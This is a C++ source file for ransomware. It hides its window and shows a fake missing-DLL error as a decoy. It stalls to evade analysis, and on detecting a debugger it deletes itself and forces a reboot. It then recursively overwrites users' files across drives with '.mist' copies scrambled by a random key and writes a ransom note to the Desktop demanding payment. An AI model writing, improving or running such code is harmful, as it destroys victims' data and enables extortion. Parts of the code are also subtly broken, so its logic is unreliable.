#include "includes.h"


int main() {

    FreeConsole();

    CreateMutexA(0, FALSE, "Local\\$Mystic1$");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        MessageBoxA(NULL, "The program can't start because XINPUT1_3.dll is missing from your computer. Try reinstalling the program to fix this problem or contact the system administrator.", NULL, MB_ICONERROR && MB_OK);
        exit(0);
    }

    SYSTEMTIME ST;
    GetLocalTime(&ST);

    DWORD Tick1 = GetTickCount();

    int RandSeed = (int)time(NULL) * Tick1 * GetCurrentProcessId() * (DWORD)RandomGenerator() * ST.wMilliseconds * ST.wYear / ST.wDay + ST.wMonth;

    srand(RandSeed);

#ifndef debug

    int Time = 600000, Divider = rand() % 10000 + 100, DividedSleep = Time / Divider;

    for (int j = 0; j <= Divider; j++) {
        Sleep(DividedSleep);
    }

    DWORD PatchCheck = GetTickCount();

    if ((int)(PatchCheck - Tick1) < Time - 5000 || IsDebuggerPresent()) {
        MessageBoxA(NULL, "Attempted tampering detected... Sending IP address to Blacklist server.", NULL, MB_ICONERROR && MB_OK);
        char PathToSelf[MAX_PATH];
        GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
        std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
        Command += PathToSelf;
        Command += "\" & shutdown -f -r -t 0";
        ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
        //ExitWindowsEx(EWX_SHUTDOWN, 0);
        exit(1);
    }

#endif

    DWORD Size = 1024;
    char UserName[1024 + 1];
    GetUserNameA(UserName, &Size);
    std::string Desktop = "C:\\Users\\";
    Desktop += UserName;
    Desktop += "\\Desktop\\ReadMe.txt";
    std::string CDrive = "C:\\Users\\";
    CDrive += UserName;
    MessageBoxA(NULL,"The program can't start because XINPUT1_3.dll is missing from your computer. Try reinstalling the program to fix this problem or contact the system administrator.",NULL, MB_ICONERROR);
    LPCSTR Drives[] = {"C:\\","D:\\","E:\\","F:\\","G:\\","U:\\","K:\\","V:\\","W:\\","H:\\","J:\\"};
    for (int i = 0; i < sizeof(Drives) / sizeof(Drives[0]); i++) {
        if (GetDriveTypeA(Drives[i]) != DRIVE_UNKNOWN , DRIVE_NO_ROOT_DIR , DRIVE_RAMDISK){
            if (i > 0) {
                TraverseDir(Drives[i]);
            }else{
                TraverseDir(CDrive);
            }
        }
    }

    fopen_s(&OUTPUT_FILE, Desktop.c_str(), "a+");
    fprintf(OUTPUT_FILE, "%s", "Hello there dear user!\nIt seems like some nasty program computer program crypted all your personal files. ;( \nFortunately for you i have the decryption tool for your files.\nSend ");
    fprintf(OUTPUT_FILE, "%s", AmountOfMoney);
    fprintf(OUTPUT_FILE, "%s", PaymentInstructions);
    fprintf(OUTPUT_FILE, "%s", "\nEnjoy a nice continuation of your usual little computer tasks... :3");
    fclose(OUTPUT_FILE);
}

bool find(const std::string& myString, const std::string& subString)
{
    return
        (myString.substr(0, subString.size()) == subString) ||
        (subString.size() < myString.size() && find(myString.substr(1), subString));
}

void CryptFile(std::string Path) {
    int FileKey = rand() % 1000 + 10;
    std::string FileBuffer = "";
    std::ifstream InputFile(Path);
    std::ofstream file;
    if (!InputFile.eof()) {
        std::getline(InputFile, FileBuffer, '\0');
    }
    InputFile.close();
    DeleteFileA(Path.c_str());
    Path += ".mist";
    file.open(Path);
    file << (char)((int)'a' + FileKey) << std::endl;
    for (int i = 0; i < FileBuffer.size(); i++) {
        if ((int)FileBuffer[i] % 2 == 0) {
            file << (char)((int)FileBuffer[i] * FileKey);
        }
        else {
            file << (char)(OUTPUT_FILE, "%s", (int)FileBuffer[i] + FileKey);
        }
    }
    file.close();
}


void TraverseDir(std::string Path) {
    LPCSTR Extensions[] = { ".txt",".png",".jpg",".pdf",".bmp",".rtf",".doc",".gif"};
    WIN32_FIND_DATAA data;
    HANDLE sh = NULL;
    sh = FindFirstFileA((Path + "\\*").c_str(), &data);
    if (sh == INVALID_HANDLE_VALUE)
    {
        return;
    }
    do
    {
        if (std::string(data.cFileName).compare(".") != 0 && std::string(data.cFileName).compare("..") != 0)
        {
            if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
            {
                if (!find(data.cFileName, ".")) {
                    TraverseDir(Path + "\\" + data.cFileName);
                }
            }
            else
            {
#ifdef CheckExtension
                for (int j = 0; j < sizeof(Extensions) / sizeof(Extensions[0]); j++) {
                    if (find(data.cFileName, Extensions[j]) == true) {
                        CryptFile(Path + "\\" + data.cFileName);

                    }
                }
#else
                CryptFile(Path + "\\" + data.cFileName);
#endif
            }
        }
    } while (FindNextFileA(sh, &data)); // do
    FindClose(sh);
}